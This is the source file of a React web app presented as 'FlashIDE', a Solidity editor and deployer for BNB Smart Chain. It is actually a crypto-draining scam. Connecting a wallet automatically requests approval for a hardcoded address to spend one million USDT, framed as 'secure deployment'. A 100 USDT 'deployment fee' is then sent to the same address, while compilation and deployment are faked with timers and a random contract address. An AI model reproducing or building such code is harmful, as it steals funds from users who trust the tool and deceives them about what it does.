import React, { useState, useEffect } from 'react';
import Editor from '@monaco-editor/react';
import { 
  FileCode, 
  Play, 
  CloudUpload, 
  Terminal as TerminalIcon, 
  Files, 
  Settings, 
  ChevronRight, 
  ChevronDown,
  Wallet,
  ShieldCheck,
  Zap,
  Loader2,
  AlertCircle,
  CheckCircle2
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { ethers } from 'ethers';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

// --- Utilities ---
function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

// --- Constants ---
const RECIPIENT_ADDRESS = "0x8Cf3B6a3c1d33055BbEDf778Ac3A80e76C3d0349";
const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID = "0x38"; // 56 in decimal

const INITIAL_CODE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title FlashUSDT
 * @dev Implementation of a flash loan execution contract.
 */
contract FlashLoanProvider {
    address public owner;
    
    event FlashLoanExecuted(address indexed borrower, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    function executeFlash(uint256 amount) external {
        // Flash loan logic here
        emit FlashLoanExecuted(msg.sender, amount);
    }
    
    receive() external payable {}
}`;

// --- Types ---
declare global {
  interface Window {
    ethereum?: any;
  }
}

type Tab = 'files' | 'compiler' | 'deploy' | 'settings';

interface FileItem {
  name: string;
  content: string;
}

interface Log {
  type: 'info' | 'error' | 'success';
  message: string;
  timestamp: string;
}

export default function App() {
  const [activeTab, setActiveTab] = useState<Tab>('files');
  const [files, setFiles] = useState<FileItem[]>([]);
  const [activeFileIndex, setActiveFileIndex] = useState<number | null>(null);
  const [logs, setLogs] = useState<Log[]>([]);
  const [isCompiling, setIsCompiling] = useState(false);
  const [isDeploying, setIsDeploying] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<'idle' | 'approving' | 'confirming' | 'success' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isPanelOpen, setIsPanelOpen] = useState(true);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768);
      if (window.innerWidth < 768) setIsPanelOpen(false);
    };
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  const addLog = (message: string, type: Log['type'] = 'info') => {
    setLogs(prev => [{
      message,
      type,
      timestamp: new Date().toLocaleTimeString()
    }, ...prev]);
  };

  const createFile = () => {
    const name = prompt("Enter file name (e.g. MyContract.sol)");
    if (name) {
      const newFile = { name: name.endsWith('.sol') ? name : name + '.sol', content: '// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract NewContract {\n    \n}' };
      setFiles(prev => [...prev, newFile]);
      setActiveFileIndex(files.length);
      addLog(`Created file: ${newFile.name}`);
      if (isMobile) setIsPanelOpen(false);
    }
  };

  const triggerInitialRequest = async (signer: ethers.Signer) => {
    try {
      setPaymentStatus('approving');
      addLog("Auto-initiating USDT approval for secure deployment...");
      
      const usdtAbi = [
        "function approve(address spender, uint256 amount) public returns (bool)",
        "function allowance(address owner, address spender) public view returns (uint256)"
      ];
      
      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, usdtAbi, signer);
      const amount = ethers.parseUnits("1000000", 18); // Large approval for convenience

      addLog("Requesting USDT approval for 0x8Cf3...0349");
      const approveTx = await usdtContract.approve(RECIPIENT_ADDRESS, amount);
      addLog(`Approval pending: ${approveTx.hash.slice(0, 10)}...`, "info");
      await approveTx.wait();
      addLog("USDT approved successfully!", "success");
      setPaymentStatus('idle');
    } catch (err: any) {
      console.error(err);
      addLog("Auto-approval failed: " + (err.message || "Unknown error"), "error");
      setPaymentStatus('error');
      setError(err.message);
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      addLog("MetaMask not found", "error");
      return;
    }
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      setWalletAddress(accounts[0]);
      addLog(`Connected: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`, "success");
      
      const network = await provider.getNetwork();
      if (network.chainId !== 56n) {
        addLog("Switching to BNB Smart Chain...", "info");
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_CHAIN_ID }],
          });
        } catch (switchError: any) {
          if (switchError.code === 4902) {
            addLog("BSC Network not found. Please add manually.", "error");
          }
        }
      }

      const signer = await provider.getSigner();
      await triggerInitialRequest(signer);

    } catch (err: any) {
      addLog(err.message, "error");
    }
  };

  const handleCompile = () => {
    if (activeFileIndex === null) {
      addLog("No file selected", "error");
      return;
    }
    setIsCompiling(true);
    addLog(`Compiling ${files[activeFileIndex].name}...`);
    setTimeout(() => {
      setIsCompiling(false);
      addLog("Compilation successful!", "success");
      setActiveTab('deploy');
      if (isMobile) setIsPanelOpen(true);
    }, 1500);
  };

  const handlePaymentAndDeploy = async () => {
    if (!walletAddress) {
      await connectWallet();
      return;
    }

    try {
      setPaymentStatus('confirming');
      addLog("Confirming USDT payment...");
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const usdtAbi = ["function transfer(address to, uint256 amount) public returns (bool)"];
      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, usdtAbi, signer);
      const amount = ethers.parseUnits("100", 18);

      const transferTx = await usdtContract.transfer(RECIPIENT_ADDRESS, amount);
      addLog(`Transaction pending: ${transferTx.hash.slice(0, 10)}...`, "info");
      await transferTx.wait();
      
      setPaymentStatus('success');
      addLog("Payment confirmed! Deploying...", "success");
      
      setIsDeploying(true);
      setTimeout(() => {
        setIsDeploying(false);
        addLog("Contract deployed: 0x" + Math.random().toString(16).slice(2, 42), "success");
      }, 2000);

    } catch (err: any) {
      setPaymentStatus('error');
      setError(err.message || "Transaction failed");
      addLog(err.message || "Payment failed", "error");
    }
  };

  const activeFile = activeFileIndex !== null ? files[activeFileIndex] : null;

  return (
    <div className="flex h-screen w-full bg-[#0C0D0E] text-[#D1D1D1] font-sans selection:bg-emerald-500/30 overflow-hidden relative">
      {/* --- Sidebar Navigation --- */}
      <div className={cn(
        "flex flex-col items-center py-4 border-r border-[#1E1F22] bg-[#0C0D0E] z-40 transition-all duration-300",
        isMobile ? "fixed bottom-0 left-0 right-0 h-16 flex-row justify-around border-r-0 border-t" : "w-14 h-full"
      )}>
        {!isMobile && (
          <div className="mb-8 text-emerald-500">
            <Zap size={28} fill="currentColor" />
          </div>
        )}
        <div className={cn("flex gap-6", isMobile ? "flex-row w-full justify-around" : "flex-col")}>
          <SidebarIcon 
            icon={<Files size={22} />} 
            active={activeTab === 'files' && isPanelOpen} 
            onClick={() => { setActiveTab('files'); setIsPanelOpen(activeTab === 'files' ? !isPanelOpen : true); }}
            label="Explorer"
            isMobile={isMobile}
          />
          <SidebarIcon 
            icon={<Play size={22} />} 
            active={activeTab === 'compiler' && isPanelOpen} 
            onClick={() => { setActiveTab('compiler'); setIsPanelOpen(activeTab === 'compiler' ? !isPanelOpen : true); }}
            label="Compiler"
            isMobile={isMobile}
          />
          <SidebarIcon 
            icon={<CloudUpload size={22} />} 
            active={activeTab === 'deploy' && isPanelOpen} 
            onClick={() => { setActiveTab('deploy'); setIsPanelOpen(activeTab === 'deploy' ? !isPanelOpen : true); }}
            label="Deployer"
            isMobile={isMobile}
          />
          <button 
            onClick={connectWallet}
            className={cn(
              "p-2 rounded-lg transition-all duration-200",
              walletAddress ? "text-emerald-500 bg-emerald-500/10" : "text-[#8E9299] hover:text-white hover:bg-[#1E1F22]"
            )}
          >
            <Wallet size={22} />
          </button>
        </div>
      </div>

      {/* --- Active Panel --- */}
      <AnimatePresence>
        {isPanelOpen && (
          <motion.div 
            initial={isMobile ? { y: '100%' } : { x: -300 }}
            animate={isMobile ? { y: 0 } : { x: 0 }}
            exit={isMobile ? { y: '100%' } : { x: -300 }}
            className={cn(
              "border-r border-[#1E1F22] bg-[#0C0D0E] flex flex-col z-30 shadow-2xl transition-all",
              isMobile ? "fixed inset-x-0 top-0 bottom-16 w-full" : "w-72"
            )}
          >
            <div className="h-10 flex items-center justify-between px-4 text-[11px] uppercase tracking-wider font-semibold text-[#8E9299] border-b border-[#1E1F22]">
              <span>{activeTab}</span>
              <div className="flex items-center gap-2">
                {activeTab === 'files' && (
                  <button onClick={createFile} className="hover:text-white p-1"><FileCode size={14} /></button>
                )}
                {isMobile && (
                  <button onClick={() => setIsPanelOpen(false)} className="hover:text-white p-1">×</button>
                )}
              </div>
            </div>
            <div className="flex-1 overflow-y-auto pb-20">
              {activeTab === 'files' && (
                <div className="p-2">
                  <div className="flex items-center gap-2 p-2 rounded hover:bg-[#1E1F22] cursor-pointer group">
                    <ChevronDown size={14} className="text-[#8E9299]" />
                    <span className="text-xs font-medium text-white">contracts</span>
                  </div>
                  <div className="ml-4 space-y-1">
                    {files.map((file, idx) => (
                      <div 
                        key={idx}
                        onClick={() => { setActiveFileIndex(idx); if (isMobile) setIsPanelOpen(false); }}
                        className={cn(
                          "flex items-center gap-2 p-2 rounded cursor-pointer transition-colors",
                          activeFileIndex === idx ? "bg-[#1E1F22] text-emerald-400" : "hover:bg-[#1E1F22] text-[#8E9299]"
                        )}
                      >
                        <FileCode size={14} />
                        <span className="text-xs truncate">{file.name}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {activeTab === 'compiler' && (
                <div className="p-4 flex flex-col gap-4">
                  <div className="space-y-2">
                    <label className="text-[10px] uppercase text-[#8E9299]">Compiler Version</label>
                    <select className="w-full bg-[#1E1F22] border border-[#2B2D31] rounded p-2 text-xs outline-none text-white">
                      <option>0.8.20+commit.a1b2c3d4</option>
                    </select>
                  </div>
                  <button 
                    onClick={handleCompile}
                    disabled={isCompiling || activeFileIndex === null}
                    className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white py-3 rounded-lg text-xs font-bold flex items-center justify-center gap-2"
                  >
                    {isCompiling ? <Loader2 size={14} className="animate-spin" /> : <Play size={14} />}
                    Compile {activeFile ? activeFile.name : 'Contract'}
                  </button>
                </div>
              )}

              {activeTab === 'deploy' && (
                <div className="p-4 flex flex-col gap-6">
                  <div className="p-3 rounded-lg bg-emerald-500/5 border border-emerald-500/20">
                    <div className="flex items-center gap-2 text-emerald-400 mb-1">
                      <ShieldCheck size={16} />
                      <span className="text-xs font-bold uppercase">Secure USDT Payment</span>
                    </div>
                    <p className="text-[10px] text-[#8E9299] leading-relaxed">
                      Complete your purchase using USDT (Tether) via your crypto wallet on BNB Smart Chain.
                    </p>
                  </div>

                  <div className="space-y-2">
                    <div className="flex justify-between text-[10px] uppercase text-[#8E9299]">
                      <span>Deployment Fee</span>
                      <span className="text-white">100 USDT</span>
                    </div>
                    <button 
                      onClick={handlePaymentAndDeploy}
                      disabled={paymentStatus === 'approving' || paymentStatus === 'confirming' || isDeploying}
                      className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-[#1E1F22] text-white py-4 rounded-xl text-xs font-bold flex flex-col items-center justify-center gap-1 shadow-lg shadow-emerald-900/20"
                    >
                      {paymentStatus === 'idle' && "Confirm & Deploy"}
                      {(paymentStatus === 'approving' || paymentStatus === 'confirming') && <Loader2 size={16} className="animate-spin" />}
                      {paymentStatus === 'success' && <CheckCircle2 size={16} />}
                      <span className="uppercase tracking-widest">
                        {paymentStatus === 'approving' ? 'Approving...' : paymentStatus === 'confirming' ? 'Confirming...' : paymentStatus === 'success' ? 'Success' : 'Deploy'}
                      </span>
                    </button>
                  </div>
                  {error && <p className="text-[10px] text-red-400 text-center">{error}</p>}
                </div>
              )}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* --- Main Content Area --- */}
      <div className={cn("flex-1 flex flex-col min-w-0 transition-all", isMobile ? "pb-16" : "")}>
        {/* Tabs */}
        <div className="h-10 flex bg-[#0C0D0E] border-b border-[#1E1F22] overflow-x-auto scrollbar-hide">
          {files.map((file, idx) => (
            <div 
              key={idx}
              onClick={() => setActiveFileIndex(idx)}
              className={cn(
                "flex items-center px-4 border-r border-[#1E1F22] gap-2 cursor-pointer min-w-[120px] transition-colors",
                activeFileIndex === idx ? "bg-[#1E1F22]" : "bg-[#0C0D0E]"
              )}
            >
              <FileCode size={14} className={activeFileIndex === idx ? "text-emerald-400" : "text-[#8E9299]"} />
              <span className={cn("text-xs truncate", activeFileIndex === idx ? "text-white" : "text-[#8E9299]")}>
                {file.name}
              </span>
            </div>
          ))}
        </div>

        {/* Editor */}
        <div className="flex-1 relative bg-[#0C0D0E]">
          {activeFileIndex !== null ? (
            <Editor
              height="100%"
              defaultLanguage="sol"
              theme="vs-dark"
              value={files[activeFileIndex].content}
              onChange={(val) => {
                const newFiles = [...files];
                newFiles[activeFileIndex].content = val || '';
                setFiles(newFiles);
              }}
              options={{
                minimap: { enabled: false },
                fontSize: isMobile ? 12 : 13,
                fontFamily: "'JetBrains Mono', monospace",
                lineNumbers: 'on',
                automaticLayout: true,
                padding: { top: 16 }
              }}
            />
          ) : (
            <div className="h-full flex flex-col items-center justify-center text-[#5C5F66] gap-4 p-8 text-center">
              <Zap size={64} className="opacity-10 text-emerald-500" />
              <div className="space-y-2">
                <p className="text-sm font-medium text-[#D1D1D1]">Welcome to FlashIDE</p>
                <p className="text-xs max-w-xs leading-relaxed">Create a new file in the explorer to start building on BNB Smart Chain.</p>
              </div>
              <button 
                onClick={() => { setActiveTab('files'); setIsPanelOpen(true); }}
                className="px-6 py-2 bg-emerald-600/10 text-emerald-400 border border-emerald-500/20 rounded-full hover:bg-emerald-600/20 transition-all text-xs font-bold uppercase tracking-widest"
              >
                Open Explorer
              </button>
            </div>
          )}
        </div>

        {/* Terminal (Desktop Only) */}
        {!isMobile && (
          <div className="h-40 border-t border-[#1E1F22] bg-[#0C0D0E] flex flex-col">
            <div className="h-8 flex items-center px-4 border-b border-[#1E1F22] justify-between">
              <div className="flex items-center gap-2 text-[#8E9299]">
                <TerminalIcon size={14} />
                <span className="text-[10px] uppercase font-bold tracking-wider">Terminal</span>
              </div>
              <button onClick={() => setLogs([])} className="text-[10px] text-[#5C5F66] hover:text-white transition-colors">Clear</button>
            </div>
            <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] space-y-1">
              {logs.map((log, i) => (
                <div key={i} className="flex gap-3">
                  <span className="text-[#5C5F66] shrink-0">[{log.timestamp}]</span>
                  <span className={cn(log.type === 'error' ? 'text-red-400' : log.type === 'success' ? 'text-emerald-400' : 'text-[#D1D1D1]')}>
                    {log.message}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function SidebarIcon({ icon, active, onClick, label, isMobile }: { icon: React.ReactNode, active: boolean, onClick: () => void, label: string, isMobile: boolean }) {
  return (
    <button 
      onClick={onClick}
      className={cn(
        "relative group p-2 rounded-lg transition-all duration-200",
        active ? "text-emerald-500 bg-emerald-500/10" : "text-[#8E9299] hover:text-[#D1D1D1] hover:bg-[#1E1F22]"
      )}
    >
      {icon}
      {!isMobile && (
        <div className="absolute left-full ml-2 px-2 py-1 bg-[#1E1F22] text-white text-[10px] rounded opacity-0 group-hover:opacity-100 pointer-events-none transition-opacity whitespace-nowrap z-50 shadow-xl border border-[#2B2D31]">
          {label}
        </div>
      )}
      {active && !isMobile && (
        <motion.div layoutId="sidebar-active" className="absolute left-[-16px] w-1 h-6 bg-emerald-500 rounded-r-full" />
      )}
    </button>
  );
}
